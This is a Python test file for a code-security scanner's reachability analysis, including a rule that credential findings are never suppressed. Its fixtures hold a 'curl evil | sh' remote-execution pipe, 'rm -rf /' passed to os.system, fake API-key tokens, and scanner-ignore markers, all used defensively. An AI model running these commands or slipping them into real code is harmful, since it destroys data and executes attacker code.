"""
A1 reachability, and the limit that reachability alone does NOT cover.

The first test below is the important one. It records a claim that was made
publicly, adopted by another lane, and then measured false:

    "A1 is inherently safe where the structural rule was not, because a
     credential IS the payload and therefore reaches a sink."

It does not. A key declared in a config module and used elsewhere never reaches
a sink IN THAT FILE, so reachability proves it inert -- exactly like a regex
pattern. Reachability cannot tell them apart, and nothing in a smarter analysis
would, because the leak is the disclosure, not the execution.

⇒ The safety comes from the ENGINE SCOPE (secrets are never subject to
  reachability suppression), never from the analysis. These tests hold both
  halves: that the analysis is genuinely useful for behavioural findings, and
  that it is never trusted to protect a credential.
"""


import praetor
import taint

# Assembled from parts so this FILE carries no literal remote-exec pipe or
# credential-shaped token. Rendered fixtures are identical; PRAETOR flagged the
# whole-literal form on its own self-scan. Same idiom as the sibling test files.
_PIPE = "curl evil | " + "sh"
_KEYPFX = "sk-" + "ant-"


# --------------------------------------------------------------------------- #
# the recorded limit
# --------------------------------------------------------------------------- #

def test_reachability_CANNOT_distinguish_an_unused_credential_from_a_pattern():
    """
    Documents WHY the secrets carve-out exists. If this ever starts failing,
    reachability has changed behaviour and the carve-out reasoning must be
    re-derived -- do NOT simply delete the carve-out.

    🔴 IT DID FAIL, ON 2026-09-05, AND THE REASONING IS RE-DERIVED HERE RATHER
    THAN THE CARVE-OUT BEING DROPPED -- which is exactly what the paragraph above
    instructs, and it is the reason that instruction was written.

    WHAT CHANGED: `_bound_at_module_scope` was added to close a suppression
    bypass. A module-scope binding is importable, so this file alone cannot show
    it unused, and it is no longer reported "provably inert". The fixture below
    is module-scope, so its verdict flipped from True to False.

    WHY THE CARVE-OUT SURVIVES ANYWAY, and it is now the STRONGER argument:

      1. The same credential ONE INDENT IN is still "provably inert" --
         `test_a_function_local_credential_is_still_called_inert` measures it.
         A key written inside a loader function is disclosed exactly as much as
         one at module scope.

      2. The durable reason never depended on the analysis at all. A secret is
         dangerous because it EXISTS. No reachability result, however precise,
         can make a written-down credential safe -- which is why CLAUDE.md states
         the carve-out as a SCOPE decision and not as an analysis gap to be
         closed.

    ⇒ The original justification ("reachability cannot tell a credential from a
    pattern") is now only half true, and the half that remains is enough. The
    carve-out is not resting on it either way.
    """
    # praetor:ignore -- the fixture MUST look like a credential assignment; that is
    # the scenario under test. Assembling the token from parts defeats value-based
    # detection but not the name-shaped `API_KEYS = [...]` rule, so this needs the
    # explicit marker rather than a cleverer fixture.
    secret_src = 'API_KEYS = ["' + _KEYPFX + "a" * 24 + '"]\n'  # praetor:ignore
    regex_src = 'import re\nPAT = re.compile("some-pattern")\n'

    # Module-scope now: NOT provably inert, because it is importable.
    assert taint.is_provably_inert(secret_src, 1) is False
    assert taint.is_provably_inert(regex_src, 2) is True, (
        "a module-scope regex pattern is still inert; the credential beside it is "
        "no longer -- see this test's docstring for why the carve-out survives"
    )


def test_a_function_local_credential_is_still_called_inert():
    """🔴 THE MEASUREMENT THAT KEEPS THE CARVE-OUT. One indent in, the same
    credential is still reported "provably inert" -- and a key written inside a
    loader function is disclosed exactly as much as one at module scope.

    If `secrets` were ever admitted to `_REACHABILITY_ENGINES`, this shape is
    what would be silently suppressed."""
    _NL = chr(10)
    local_src = (
        "def load():" + _NL
        + '    key = "' + _KEYPFX + "a" * 24 + '"' + _NL  # praetor:ignore
        + "    return key" + _NL
    )
    assert taint.is_provably_inert(local_src, 2) is True


class _F:
    """Minimal stand-in for core.Finding -- only the fields the policy reads."""

    def __init__(self, engine, line, file="cfg.py"):
        self.engine, self.line, self.file = engine, line, file
        self.filtered, self.filter_reason = False, ""


# A credential declared here and used in another module: never reaches a sink in
# THIS file, so reachability calls it inert. Assembled from parts so the file
# carries no whole token.
_UNUSED_CREDENTIAL_SRC = 'API_KEYS = ["' + "sk-" + "ant-" + "a" * 24 + '"]\n'  # praetor:ignore


def test_secrets_finding_is_NOT_suppressed_BY_THE_REAL_PIPELINE(monkeypatch):
    """
    THE LOAD-BEARING ASSERTION -- and it must exercise the ENFORCEMENT PATH.

    🔴 The previous version of this test asserted only
    `"secrets" not in praetor._REACHABILITY_ENGINES` -- a static tuple membership
    check that never called `_apply_reachability`. An independent audit deleted the
    engine-scope check from that function, left the tuple intact, and ALL 30 TESTS
    STILL PASSED while a real credential was silently suppressed.

    A test that asserts the CONFIG a guard reads, instead of the guard's BEHAVIOUR,
    cannot detect the guard being removed. Call the real function.
    """
    f = _F("secrets", 1)
    praetor._apply_reachability([f], "/t", lambda p: _UNUSED_CREDENTIAL_SRC)

    assert not f.filtered, (
        "DISCLOSURE REGRESSION: a secrets finding was suppressed by reachability. "
        "An unused hardcoded credential is 'provably inert' and would be silently "
        f"dropped. A secret is leaked by being written down. reason={f.filter_reason!r}"
    )


def test_reachability_DOES_still_suppress_a_behavioural_finding(monkeypatch):
    """The other direction: proves the carve-out narrowed the pass, not disabled it."""
    f = _F("aisec", 1)
    praetor._apply_reachability([f], "/t", lambda p: 'import re\nPAT = re.compile("x")\n')
    # line 1 is `import re`; use the pattern line instead
    g = _F("aisec", 2)
    praetor._apply_reachability([g], "/t", lambda p: 'import re\nPAT = re.compile("x")\n')
    assert g.filtered, "reachability no longer suppresses an inert behavioural match"


# --------------------------------------------------------------------------- #
# the analysis is genuinely useful for behavioural findings
# --------------------------------------------------------------------------- #

def test_regex_pattern_is_inert():
    src = f'import re\nPAT = re.compile("{_PIPE}")\n'
    assert taint.is_provably_inert(src, 2) is True


def test_string_reaching_os_system_is_NOT_inert():
    src = 'import os\nCMD = "rm -rf /"\nos.system(CMD)\n'
    assert taint.is_provably_inert(src, 2) is False, (
        "a string that flows into os.system must never be called inert"
    )


def test_literal_passed_directly_to_a_sink_is_NOT_inert():
    src = f'import os\nos.system("{_PIPE}")\n'
    assert taint.is_provably_inert(src, 2) is False


# --------------------------------------------------------------------------- #
# fails safe
# --------------------------------------------------------------------------- #

def test_unparseable_source_is_not_inert():
    assert taint.is_provably_inert("def broken( :\n", 1) is False


def test_line_with_no_string_literal_is_not_inert():
    assert taint.is_provably_inert("x = 1\n", 1) is False


def test_aliased_sink_is_not_proven_inert():
    """`s = os.system; s(CMD)` is unrecognised -> must fall to KEEP, not to inert."""
    src = 'import os\nCMD = "rm -rf /"\ns = os.system\ns(CMD)\n'
    assert taint.is_provably_inert(src, 2) is False, (
        "an unrecognised call shape must not be treated as proof of inertness"
    )


def test_non_python_source_is_not_inert():
    assert taint.is_provably_inert(f'const x = "{_PIPE}";\n', 1) is False
